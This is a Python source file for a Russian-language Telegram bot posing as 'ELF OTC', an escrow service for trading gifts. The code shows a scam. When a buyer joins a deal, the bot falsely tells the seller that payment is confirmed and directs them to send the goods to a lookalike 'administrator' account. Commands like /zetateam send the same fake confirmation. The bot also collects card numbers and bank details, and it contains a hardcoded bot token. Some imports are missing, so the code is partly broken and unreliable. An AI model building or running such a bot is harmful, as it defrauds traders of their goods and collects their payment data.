import logging
import random
import string
import re
from telegram import Update
from telegram.ext import (ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler)


# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# Глобальные данные
user_data = {}  # Данные пользователей
deals = {}      # Сделки: deal_id -> {'owner_id':..., 'name':..., 'amount':..., 'product_name':..., 'joined_user_id':...}

bot_username = 'OtcEIfGiftsRobot'  # Укажите ник бота без @

# Функция для отправки сообщения с кнопками подтверждения
async def send_confirmation_with_buttons(context, owner_id, deal_id, deal_name, product_name):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Я отправил подарок! 🎁", callback_data='gift_sent')],
        [InlineKeyboardButton("💖 Поддержка 🌐", url='https://t.me/OtcEIfGifttsRobot')]
    ])
    message_text = f"✅ Оплата подтверждена для сделки #{deal_id} 🚀\n\n" \
                   f"📜 Описание: {product_name} ✨\n" \
                   f"👤 Отправьте подарок администратору — @OtcEIfGifttsRobot / 🔗 https://t.me/OtcEIfGifttsRobot"
    await context.bot.send_message(owner_id, message_text, reply_markup=keyboard)

# Стартовая команда
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    chat_id = update.message.chat_id

    # Обработка реферальных ссылок
    if args and args[0].startswith('ref_'):
        deal_id = args[0][4:]
        deal = deals.get(deal_id)
        if deal:
            owner_id = deal['owner_id']
            if chat_id == owner_id:
                await update.message.reply_text("🚫 Вы создали эту сделку и не можете присоединиться к ней.")
            elif deal.get('joined_user_id'):
                await update.message.reply_text("⚠️ К этой сделке уже присоединился другой пользователь.")
            else:
                deal['joined_user_id'] = chat_id
                await context.bot.send_message(owner_id, f"✅ К сделке: {deal['name']} присоединился пользователь @{update.message.from_user.username or update.message.from_user.first_name}.")
                await send_confirmation_with_buttons(context, owner_id, deal_id, deal['name'], deal.get('product_name', 'не указано'))
                await update.message.reply_text(f"🎉 Вы присоединились к сделке: {deal['name']}! Спасибо! 🙌")
        else:
            await update.message.reply_text("⚠️ Реферальная ссылка недействительна.")
        return

    # Инициализация данных пользователя
    if chat_id not in user_data:
        user_data[chat_id] = {
            'wallet': {},
            'language': 'ru',
            'current_transaction': None,
            'transactions': {},
            'seller_id': None,
            'step': None
        }

    # Главное меню
    buttons = [
        [InlineKeyboardButton("➕ Добавить/изменить кошелек 🔐", callback_data='wallet')],
        [InlineKeyboardButton("📝 Создать сделку 💼", callback_data='create_deal')],
        [InlineKeyboardButton("🔗 Реферальная ссылка 🌟", callback_data='ref_link')],
        [InlineKeyboardButton("🌐 Сменить язык 🌍", callback_data='change_language')],
        [InlineKeyboardButton("📞 Поддержка 📩", callback_data='support')]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    image_url = 'https://avatars.mds.yandex.net/i?id=6a3d1bb30b9f72e1d4ff20f6c13c925bd67f54aa-16476092-images-thumbs&n=13'

    await context.bot.send_photo(
        chat_id=chat_id,
        photo=image_url,
        caption=(
            "🚀 Добро пожаловать в ELF OTC – ваш надежный P2P-гарант! 💼✨\n\n"
            "🛍️ Покупайте и продавайте всё, что угодно – безопасно! 💎\n"
            "🔒 Сделки проходят легко и без риска.\n\n"
            "🔹 Удобное управление кошельками 🔑\n"
            "🔖 Реферальная система 📖 \n\n"
            "📚 Инструкция: https://telegra.ph/Podrobnyj-gajd-po-ispolzovaniyu-GiftElfRobot-04-25\n\n"
            "Выберите нужный раздел ниже:"
        ),
        reply_markup=keyboard
    )

# Обработка нажатий кнопок
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    data = query.data

    if chat_id not in user_data:
        user_data[chat_id] = {
            'wallet': {},
            'language': 'ru',
            'current_transaction': None,
            'transactions': {},
            'seller_id': None,
            'step': None
        }

    if data == 'wallet':
        user_data[chat_id]['step'] = 'enter_wallet'
        await query.message.reply_text("💳 Добавление кошелька\n\nПожалуйста, введите номер карты из 16 цифр без пробелов или TON кошелек")
    elif data == 'create_deal':
        user_data[chat_id]['step'] = 'deal_name'
        if user_data[chat_id]['seller_id'] is None:
            user_data[chat_id]['seller_id'] = chat_id
        await query.message.reply_text("📝 Укажите, что вы предлагаете в сделке:\n\nПример: 10 Кепок и Пепе... 🚀")
    elif data == 'ref_link':
        await query.message.reply_text("🚧 Эта функция пока что отключена администрацией! 🔧")
    elif data == 'change_language':
        user_data[chat_id]['step'] = 'choose_language'
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru')],
            [InlineKeyboardButton("🇺🇸 English", callback_data='lang_en')]
        ])
        await query.message.reply_text("🗣️ Выберите язык:", reply_markup=keyboard)
    elif data == 'support':
        support_button = InlineKeyboardMarkup([
            [InlineKeyboardButton("Перейти в поддержку 🌐", url='https://t.me/OtcEIfGifttsRobot')]
        ])
        await query.message.reply_text("📞 Нажмите кнопку ниже, чтобы связаться с поддержкой:", reply_markup=support_button)
    elif data.startswith('lang_'):
        lang = data.split('_')[1]
        user_data[chat_id]['language'] = lang
        await query.message.reply_text(f"📝 Язык изменен на {'Русский' if lang=='ru' else 'English'} 🌟")
    elif data == 'gift_sent':
        await query.message.reply_text("🎉 Спасибо за подтверждение! Мы продолжим обработку вашей сделки. 🚀")
    else:
        await query.message.reply_text("❓ Неизвестная команда или ошибка. ⚠️")

# Обработка входящих сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    text = update.message.text.strip()

    if chat_id not in user_data:
        user_data[chat_id] = {
            'wallet': {},
            'language': 'ru',
            'current_transaction': None,
            'transactions': {},
            'seller_id': None,
            'step': None
        }

    step = user_data[chat_id]['step']

    # Обработка добавления кошелька
    if step == 'enter_wallet':
        # Проверка на 20 цифр
        if len(text) == 16 and text.isdigit():
            user_data[chat_id]['wallet']['number'] = text
            user_data[chat_id]['step'] = 'enter_bank'
            await update.message.reply_text("🏦 Пожалуйста, уточните, какой у вас банк! 🏛️")
        # Или TON кошелек (начинается с UQC)
        elif re.match(r'U', text):
            user_data[chat_id]['wallet']['ton'] = text
            user_data[chat_id]['step'] = 'enter_bank'
            await update.message.reply_text("🏦 Указан TON кошелек. Пожалуйста, укажите ваш банк.")
        else:
            await update.message.reply_text("❌ Ошибка: введите номер карты из 16 цифр без пробелов или TON кошелек")
        return

    elif step == 'enter_bank':
        user_data[chat_id]['wallet']['bank'] = text
        user_data[chat_id]['step'] = None
        await update.message.reply_text("✅ Кошелек успешно добавлен/изменен! 🎉")
        await start(update, context)
        return

    # Создание сделки
    if step == 'deal_name':
        # Создаем новую сделку
        deal_id_local = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        deals[deal_id_local] = {
            'owner_id': chat_id,
            'name': text,
            'amount': None,
            'product_name': None,
            'joined_user_id': None
        }
        user_data[chat_id]['current_transaction'] = deal_id_local
        # Спрашиваем сумму в зависимости от типа кошелька
        wallet_info = user_data[chat_id]['wallet']
        if 'number' in wallet_info:
            # карта — в RUB
            user_data[chat_id]['step'] = 'deal_amount'
            await update.message.reply_text("💰 Введите сумму RUB в формате: 5000")
        elif 'ton' in wallet_info:
            # TON — в TON
            user_data[chat_id]['step'] = 'deal_amount'
            await update.message.reply_text("💰 Введите сумму TON в формате: 100")
        else:
            # Не определено, по умолчанию
            user_data[chat_id]['step'] = 'deal_amount'
            await update.message.reply_text("💰 Введите сумму в формате: 5000")
        return

    elif step == 'deal_amount':
        wallet_info = user_data[chat_id]['wallet']
        if 'number' in wallet_info:
            # Карта — в RUB
            try:
                amount = float(text)
                deal_id_local = user_data[chat_id]['current_transaction']
                deals[deal_id_local]['amount'] = amount
                await update.message.reply_text("💼 Введите описание товара/услуги:\n\nПример: Буду депать весь баланс... 🚀")
                user_data[chat_id]['step'] = 'deal_product_name'
            except ValueError:
                await update.message.reply_text("❗ Пожалуйста, введите корректную сумму! 💸")
        elif 'ton' in wallet_info:
            # TON — в TON
            try:
                amount = float(text)
                deal_id_local = user_data[chat_id]['current_transaction']
                deals[deal_id_local]['amount'] = amount
                await update.message.reply_text("💼 Введите описание товара/услуги:\n\nПример: Буду депать весь баланс... 🚀")
                user_data[chat_id]['step'] = 'deal_product_name'
            except ValueError:
                await update.message.reply_text("❗ Пожалуйста, введите корректную сумму! 💸")
        else:
            # Не определено, по умолчанию
            try:
                amount = float(text)
                deal_id_local = user_data[chat_id]['current_transaction']
                deals[deal_id_local]['amount'] = amount
                await update.message.reply_text("💼 Введите описание товара/услуги:\n\nПример: Буду депать весь баланс... 🚀")
                user_data[chat_id]['step'] = 'deal_product_name'
            except:
                await update.message.reply_text("❗ Пожалуйста, введите сумму в правильном формате.")
        return

    elif step == 'deal_product_name':
        deal_id_local = user_data[chat_id]['current_transaction']
        deals[deal_id_local]['product_name'] = text
        # Генерация ссылки
        link = f"https://t.me/{bot_username}?start=ref_{deal_id_local}"
        await update.message.reply_text(
            f"✅ Сделка успешно создана!\n\n🔗 Ссылка для покупателя: {link} 🛍️"
        )
        user_data[chat_id]['step'] = None
        return

# Команды подтверждения платежа
async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    user_deals = [deal_id for deal_id, deal in deals.items() if deal.get('joined_user_id') == chat_id]
    if not user_deals:
        await update.message.reply_text("🛑 У вас нет активных сделок для подтверждения оплаты.")
        return
    for deal_id in user_deals:
        deal = deals[deal_id]
        owner_id = deal['owner_id']
        await send_confirmation_with_buttons(context, owner_id, deal_id, deal['name'], deal.get('product_name', 'не указано'))
        await update.message.reply_text(f"✅ Вы подтвердили оплату по сделке: {deal['name']}! 🎉 Создатель сделки уведомлен.")
        deal['joined_user_id'] = None

def main():
    application = ApplicationBuilder().token('8222231241:AAFf0qh0CJ41vV463tgwT2sticwx9a9eyxc').build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('zetateam', confirm_payment))
    application.add_handler(CommandHandler('pay', confirm_payment))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🚀 Бот запущен")
    application.run_polling()

if __name__ == '__main__':

    main()




